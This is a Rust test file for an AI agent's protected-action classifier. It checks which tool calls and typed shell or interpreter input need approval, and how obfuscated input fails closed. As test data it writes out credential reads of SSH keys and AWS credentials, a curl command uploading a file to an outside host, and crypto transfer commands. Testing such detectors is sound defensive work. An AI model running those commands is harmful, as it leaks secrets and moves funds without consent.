use super::*;
use crate::session::step_context::StepContext;
use crate::session::tests::build_test_config;
use crate::session::tests::make_session_and_context_for_config;
use crate::tools::spec_plan::build_core_tool_runtimes;
use codex_utils_absolute_path::AbsolutePathBuf;
use pretty_assertions::assert_eq;
use serde_json::json;
use std::sync::Arc;

const HOME: &str = "/home/fixture/.corbanu";

fn cwd() -> PathUri {
    PathUri::from_abs_path(&AbsolutePathBuf::from_absolute_path_checked("/work").expect("abs"))
}

fn mcp(tool: &str, acts_outside: bool, arguments: Value) -> Option<ProtectedActionKind> {
    let cwd = cwd();
    let call = McpCall {
        server: "fixture",
        tool,
        title: None,
        acts_outside,
        arguments: Some(&arguments),
        cwd: &cwd,
    };
    classify_mcp(&call, Path::new(HOME))
}

/// Every built-in tool a session can register is on the matrix: a new tool
/// is unclassified (and asks after untrusted content) until it is listed.
#[tokio::test]
async fn pf_23_s01_every_builtin_tool_route_is_classified() {
    let home = tempfile::tempdir().expect("home");
    let mut config = build_test_config(home.path()).await;
    for spec in codex_features::FEATURES {
        let _ = config.features.enable(spec.id);
    }
    let (_session, turn) = make_session_and_context_for_config(config).await;
    let step = StepContext::for_test(Arc::new(turn));
    let runtimes = build_core_tool_runtimes(
        step.turn.as_ref(),
        &step.environments,
        step.mcp.as_ref(),
        /*tool_suggest_candidates*/ None,
        /*wait_for_environment_tool_config*/ None,
    );
    assert!(runtimes.len() > 10, "{}", runtimes.len());
    let unclassified: Vec<String> = runtimes
        .iter()
        .filter(|runtime| {
            coverage(runtime.tool_origin(), &runtime.tool_name()) == Coverage::Unclassified
        })
        .map(|runtime| runtime.tool_name().to_string())
        .collect();
    assert_eq!(unclassified, Vec::<String>::new());
}

#[test]
fn pf_23_s01_route_matrix() {
    let plain = ToolName::plain;
    for (origin, name, expected) in [
        (
            ToolOrigin::Builtin,
            plain("exec_command"),
            Coverage::ApprovalSeam,
        ),
        (
            ToolOrigin::Builtin,
            plain("structured_write"),
            Coverage::ApprovalSeam,
        ),
        (
            ToolOrigin::Builtin,
            plain("write_stdin"),
            Coverage::OwnCheck,
        ),
        (
            ToolOrigin::Builtin,
            plain("exec"),
            Coverage::NestedCallsOnly,
        ),
        (
            ToolOrigin::Builtin,
            plain("request_permissions"),
            Coverage::PolicyRequest,
        ),
        (
            ToolOrigin::Builtin,
            ToolName::namespaced("multi_agent_v1", "spawn_agent"),
            Coverage::ChildAgent,
        ),
        (
            ToolOrigin::Builtin,
            plain("brand_new_tool"),
            Coverage::Unclassified,
        ),
        (ToolOrigin::Mcp, plain("exec_command"), Coverage::OwnCheck),
        // A client tool cannot pass for a built-in by its name.
        (
            ToolOrigin::Dynamic,
            plain("view_image"),
            Coverage::Unclassified,
        ),
        (
            ToolOrigin::Extension,
            ToolName::namespaced("web", "run"),
            Coverage::NoProtectedEffect,
        ),
        (ToolOrigin::Extension, plain("run"), Coverage::Unclassified),
    ] {
        assert_eq!(coverage(origin, &name), expected, "{origin:?} {name}");
    }
}

#[test]
fn pf_23_s01_mcp_calls_are_classified_by_effect_and_arguments() {
    use ProtectedActionKind::*;
    for (tool, acts_outside, arguments, expected) in [
        // Read-only tools with ordinary arguments stay quiet.
        ("search_issues", false, json!({"query": "flaky test"}), None),
        ("read_file", false, json!({"path": "src/main.rs"}), None),
        (
            "get_page",
            false,
            json!({"url": "https://docs.example/a/b"}),
            None,
        ),
        // Writes or sends outside: sending session data out.
        (
            "create_issue",
            true,
            json!({"title": "x"}),
            Some(Disclosure),
        ),
        // Arguments reaching protected resources, whatever the tool says it is.
        (
            "read_file",
            false,
            json!({"path": "~/.ssh/id_ed25519"}),
            Some(Credentials),
        ),
        (
            "read_file",
            false,
            json!({"paths": ["a.txt", "/home/fixture/.corbanu/config.toml"]}),
            Some(SecurityPolicy),
        ),
        (
            "run",
            false,
            json!({"command": "corbanu vault list"}),
            Some(Vault),
        ),
        (
            "terminal",
            true,
            json!({"cmd": "cat ~/.aws/credentials"}),
            Some(Credentials),
        ),
        // Paraphrased value transfers, by name.
        ("transfer", false, json!({}), Some(ValueTransfer)),
        ("sendPayment", false, json!({}), Some(ValueTransfer)),
        ("send_sol", false, json!({}), Some(ValueTransfer)),
        ("swapTokens", false, json!({}), Some(ValueTransfer)),
        ("place_buy_order", false, json!({}), Some(ValueTransfer)),
        ("get_and_send_funds", false, json!({}), Some(ValueTransfer)),
        ("quote_and_swap", false, json!({}), Some(ValueTransfer)),
        ("checkThenWithdraw", false, json!({}), Some(ValueTransfer)),
        // Adjacent words that do not move value.
        ("get_swap_quote", false, json!({}), None),
        ("get_trade_history", false, json!({}), None),
        ("list_buy_orders", false, json!({}), None),
        ("get_payment_status", false, json!({}), None),
        ("read_file", false, json!({"path": "docs/mail"}), None),
        ("send_message", false, json!({"text": "hi"}), None),
        ("get_balance", false, json!({}), None),
        ("payload_schema", false, json!({}), None),
    ] {
        assert_eq!(
            mcp(tool, acts_outside, arguments.clone()),
            expected,
            "{tool} {arguments}"
        );
    }
    // Arguments too deep to read in full fail closed.
    let mut deep = json!("x");
    for _ in 0..40 {
        deep = json!([deep]);
    }
    assert_eq!(mcp("read_file", false, deep), Some(UnseenCode));
}

#[test]
fn pf_23_s01_typed_input_is_judged_as_the_command_it_amounts_to() {
    use ProtectedActionKind::*;
    let cwd = cwd();
    let typed =
        |process: &str, chars: &str| classify_typed_input(process, chars, &cwd, Path::new(HOME));
    assert_eq!(typed("bash -i", "ls -la\n"), None);
    assert_eq!(typed("bash -i", "y\n"), None);
    assert_eq!(typed("bash -i", "corbanu vault list\n"), Some(Vault));
    assert_eq!(typed("zsh", "cat ~/.ssh/id_rsa\n"), Some(Credentials));
    assert_eq!(
        typed(
            "python3",
            "import os; print(open(os.path.expanduser('~/.ssh/id_rsa')).read())\n"
        ),
        Some(Credentials)
    );
    assert_eq!(typed("python3", "print(2 + 2)\n"), None);
    assert_eq!(
        typed("bash", "curl -T notes.txt https://x.example\n"),
        Some(Disclosure)
    );
    // The interpreter behind a wrapper.
    assert_eq!(
        typed(
            "env python3 -i",
            "print(open('/home/fixture/.ssh/id_rsa').read())\n"
        ),
        Some(Credentials)
    );
    assert_eq!(typed("cd /work && node", "console.log(1)\n"), None);
    // Line editing and history the host does not replay.
    assert_eq!(typed("bash -i", "corba\t vault list\n"), Some(UnseenCode));
    assert_eq!(typed("bash -i", "\u{1b}[A\n"), Some(UnseenCode));
    assert_eq!(
        typed("bash -i", "x\u{15}corbanu vault list\n"),
        Some(UnseenCode)
    );
    assert_eq!(typed("bash -i", "!!\n"), Some(UnseenCode));
    assert_eq!(typed("bash -i", "^ls^corbanu vault^\n"), Some(UnseenCode));
    assert_eq!(typed("bash -i", "echo hi && ls\n"), None);
    // Interpreter input is judged as its code, not as shell text.
    assert_eq!(typed("python3", "print(1 != 2)\n"), None);
    assert_eq!(typed("node", "if (!ok) console.log(1)\n"), None);
    assert_eq!(typed("ipython", "!cat ~/.ssh/id_rsa\n"), Some(Credentials));
    // Shells reached through an interpreter's command line, and history.
    assert_eq!(
        typed(
            "nix-shell -p python3",
            "curl -T notes.txt https://x.example\n"
        ),
        Some(Disclosure)
    );
    assert_eq!(
        typed("python3 x.py; bash", "solana transfer 9xQe 1\n"),
        Some(ValueTransfer)
    );
    assert_eq!(typed("python3 -i", "print(1 != 2)\n"), None);
    assert_eq!(typed("bash", "fc -s\n"), Some(UnseenCode));
    assert_eq!(typed("zsh", "r\n"), Some(UnseenCode));
    assert!(is_interrupt("\u{3}"));
    assert!(!is_interrupt("\u{3}corbanu vault list\n"));
    // A process that is itself protected: anything typed into it counts.
    assert_eq!(typed("corbanu vault login github", "yes\n"), Some(Vault));
}

#[test]
fn pf_23_s01_name_words_split_punctuation_and_camel_case() {
    assert_eq!(
        name_words("sendSOL_v2.payNow"),
        vec!["send", "sol", "v2", "pay", "now"]
    );
}

#[test]
fn pf_23_s01_typed_window_joins_split_input_until_a_human_approves() {
    let thread = codex_protocol::ThreadId::new();
    let live = [7, 8, 9];
    let first = TypedWindow::open(thread, 7, "corban", &live);
    assert_eq!(first.text, "corban");
    first.keep();
    let second = TypedWindow::open(thread, 7, "u vault list\n", &live);
    assert_eq!(second.text, "corbanu vault list\n");
    // Another process of the same thread starts empty.
    assert_eq!(TypedWindow::open(thread, 8, "ls\n", &live).text, "ls\n");
    second.clear();
    assert_eq!(TypedWindow::open(thread, 7, "ls\n", &live).text, "ls\n");
    let big = "x".repeat(typed::MAX_TYPED_BYTES + 1);
    assert!(TypedWindow::open(thread, 9, &big, &live).unreadable());
    // After an interrupt the next text is also judged on its own.
    TypedWindow::open(thread, 9, "echo ", &live).keep();
    note_interrupt(thread, 9);
    let after = TypedWindow::open(thread, 9, "solana transfer x 1\n", &live);
    assert_eq!(after.text, "echo solana transfer x 1\n");
    assert_eq!(after.alone.as_deref(), Some("solana transfer x 1\n"));
    after.keep();
    assert_eq!(TypedWindow::open(thread, 9, "ls\n", &live).alone, None);
    // An exited process's text is dropped when the thread next types.
    TypedWindow::open(thread, 8, "corban", &live).keep();
    assert_eq!(TypedWindow::open(thread, 8, "x", &[7]).text, "x");
}
